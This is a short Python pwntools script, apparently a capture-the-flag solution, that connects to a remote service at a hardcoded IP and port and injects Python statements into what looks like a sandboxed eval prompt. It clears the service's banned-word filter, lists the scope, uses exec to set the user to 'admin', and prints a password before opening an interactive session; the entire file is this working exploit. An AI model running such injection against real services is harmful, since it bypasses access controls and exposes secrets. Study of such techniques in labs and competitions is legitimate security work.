from pwn import *
import json
import codecs
from Crypto.Util.number import long_to_bytes

ip = "34.101.122.7"
sock = 10008

r = remote(ip, sock)
r.recvuntil(b": ")
r.sendline(b"john")

r.recvuntil(b"> ")
r.sendline(b"banned.clear()")

r.recvuntil(b"> ")
r.sendline(b"print(dir())")

r.recvuntil(b"> ")
r.sendline(b"exec('user = \'admin\'')")

r.recvuntil(b"> ")
r.sendline(b"print(password.read())")
base = r.recv()
print(base)

r.interactive()
